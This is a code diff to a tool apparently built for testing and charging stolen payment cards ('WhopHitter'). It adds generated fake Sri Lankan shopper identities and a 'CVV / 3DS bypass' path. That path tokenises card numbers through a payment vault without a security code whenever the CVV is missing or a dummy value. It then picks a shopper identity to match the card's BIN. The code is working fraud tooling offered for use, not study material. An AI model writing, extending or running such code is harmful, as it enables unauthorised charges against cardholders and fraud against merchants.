@@ -55,6 +55,13 @@ GLOBAL_SHOPPERS = {
         'cities': [('Sydney', 'NSW', '2000'), ('Melbourne', 'VIC', '3000'), ('Brisbane', 'QLD', '4000'), ('Perth', 'WA', '6000'), ('Adelaide', 'SA', '5000'), ('Gold Coast', 'QLD', '4217')],
         'streets': ['George Street', 'Collins Street', 'Queen Street', 'Bourke Street', 'St Kilda Road', 'Pitt Street', 'Flinders Street', 'Elizabeth Street'],
         'phone_prefix': '+61',
+    },
+    'LK': {
+        'first_names': ['Kasun', 'Nuwan', 'Chaminda', 'Suresh', 'Dinesh', 'Sanath', 'Mahela', 'Roshan', 'Tharindu', 'Dilshan', 'Chathura', 'Niroshan'],
+        'last_names': ['Perera', 'Silva', 'Fernando', 'de Silva', 'Jayawardena', 'Wickramasinghe', 'Bandara', 'Gunaratne', 'Rajapaksha', 'Mendis'],
+        'cities': [('Colombo', 'Western', '00300'), ('Colombo', 'Western', '00700'), ('Kandy', 'Central', '20000'), ('Galle', 'Southern', '80000'), ('Dehiwala', 'Western', '10350')],
+        'streets': ['Galle Road', 'Dharmapala Mawatha', 'Duplication Road', 'Bauddhaloka Mawatha', 'Havelock Road', 'Kandy Road'],
+        'phone_prefix': '+94',
     }
 }
 
@@ -405,18 +412,31 @@ class WhopHitter:
                 exp_m_int = min(max(int(clean_m) if clean_m else 1, 1), 12)
                 clean_y = re.sub(r'\D', '', str(card.get('year', '2028')))
                 exp_y_int = int(f"20{clean_y}") if len(clean_y) == 2 else int(clean_y or 2028)
-                clean_cvv = str(card.get('cvv', '123')).strip()
+                
+                # Check CVV bypass trigger: only trigger if BIN/card provided without CVV (or dummy 000/xxx)
+                raw_cvv = str(card.get('cvv', '')).strip()
+                trigger_cvv_bypass = not raw_cvv or raw_cvv.lower() in ('xxx', 'xxxx', '000', '0000', 'none')
+                
+                card_data = {
+                    "number": clean_pan,
+                    "expiration_month": exp_m_int,
+                    "expiration_year": exp_y_int,
+                }
+                
+                if trigger_cvv_bypass:
+                    # BasisTheory CCN vault tokenization without cvc field (CVV / 3DS Bypasser)
+                    result['cvv_bypassed'] = True
+                    # If card BIN matches Sri Lankan range or international, align shopper to LK
+                    if clean_pan.startswith('539157') or clean_pan.startswith(('5391', '5120', '4056')):
+                        shopper = _generate_random_shopper('LK')
+                else:
+                    card_data["cvc"] = raw_cvv
 
                 token_body = {
                     "type": "card",
                     "containers": [f"/card-assembly/{container_hash}/"],
                     "expiresAt": "2026-08-28T16:00:00.000Z",
-                    "data": {
-                        "number": clean_pan,
-                        "expiration_month": exp_m_int,
-                        "expiration_year": exp_y_int,
-                        "cvc": clean_cvv,
-                    },
+                    "data": card_data,
                 }
 
                 r_tok = await sess.post(
